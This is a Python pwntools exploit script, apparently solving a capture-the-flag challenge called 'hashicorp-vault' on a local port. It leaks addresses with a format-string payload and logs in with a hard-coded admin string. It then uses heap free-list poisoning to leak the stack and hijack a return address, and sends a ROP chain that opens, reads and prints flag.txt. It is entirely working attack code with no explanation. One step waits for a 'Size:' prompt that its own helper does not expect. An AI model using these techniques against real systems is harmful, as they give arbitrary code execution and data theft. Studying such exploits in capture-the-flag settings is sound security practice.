#!/usr/bin/env python3
from pwn import *

def main():
    exe = ELF("./dist/hashicorp-vault", checksec=False)
    libc = ELF("./lib/libc.so.6", checksec=False)
    
    if args.LOCAL:
        r = process(["./dist/hashicorp-vault"])
    else:
        r = remote("127.0.0.1", 1112)

    def rent(idx, size):
        r.sendlineafter(b"> ", b"1")
        r.sendlineafter(b"Vault index (0-9): ", str(idx).encode())
        r.sendlineafter(b"Size: ", str(size).encode())

    def store(idx, data):
        r.sendlineafter(b"> ", b"2")
        r.sendlineafter(b"Vault index: ", str(idx).encode())
        r.sendafter(b"Data: ", data)

    def view(idx):
        r.sendlineafter(b"> ", b"3")
        r.sendlineafter(b"Vault index: ", str(idx).encode())
        r.recvuntil(b"Item: ")
        return r.recvline().strip()

    def ret(idx):
        r.sendlineafter(b"> ", b"4")
        r.sendlineafter(b"Vault index: ", str(idx).encode())

    r.sendafter(b"Username: ", b"%p."*25)
    r.recvuntil(b"user: ")
    leaks = r.recvline().strip().split(b".")
    
    pie_leak = int(leaks[16], 16)
    libc_leak = int(leaks[20], 16)
    
    exe.address = pie_leak - 0x1875
    libc.address = libc_leak - 0x24083
    
    log.success(f"PIE base: {hex(exe.address)}")
    log.success(f"Libc base: {hex(libc.address)}")
    
    r.sendafter(b"Username: ", b"S3cr3t_M4st3r_4dm1n\n\x00")
    r.recvuntil(b"Welcome back, Admin!")
    
    rent(0, 0x20)
    rent(1, 0x20)
    ret(1)
    ret(0)
    
    store(0, p64(libc.sym['environ']))
    
    rent(2, 0x20)
    rent(3, 0x20) 
    
    stack_leak = u64(view(3).ljust(8, b'\x00'))
    log.success(f"Stack (environ): {hex(stack_leak)}")
    
    OFFSET_TO_STORE_ITEM_RET = 0x140
    ret_addr_store_item = stack_leak - OFFSET_TO_STORE_ITEM_RET
    log.success(f"Targeting store_item ret addr at: {hex(ret_addr_store_item)}")
    
    flag_bss = exe.bss() + 0x200
    rent(8, 0x20)
    rent(9, 0x20)
    ret(9)
    ret(8)
    store(8, p64(flag_bss))
    rent(4, 0x20)
    rent(5, 0x20) 
    store(5, b"flag.txt\x00")
    
    rop = ROP(libc)
    
    rop(rdi=flag_bss, rsi=0, rax=2) 
    rop.raw(rop.find_gadget(['syscall', 'ret']).address)
    
    rop(rdi=3, rsi=flag_bss+0x20, rdx=0x100, rax=0) 
    rop.raw(rop.find_gadget(['syscall', 'ret']).address)
    
    rop(rdi=1, rsi=flag_bss+0x20, rdx=0x100, rax=1) 
    rop.raw(rop.find_gadget(['syscall', 'ret']).address)
    
    rop_chain = rop.chain()
    
    rent(6, 0x100)
    rent(7, 0x100)
    ret(7)
    ret(6)
    
    store(6, p64(ret_addr_store_item))
    
    rent(8, 0x100)
    
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"Vault index: ", b"9")
    r.sendlineafter(b"Size: ", b"256")
    r.sendafter(b"Data: ", rop_chain)
    
    r.interactive()

if __name__ == "__main__":
    main()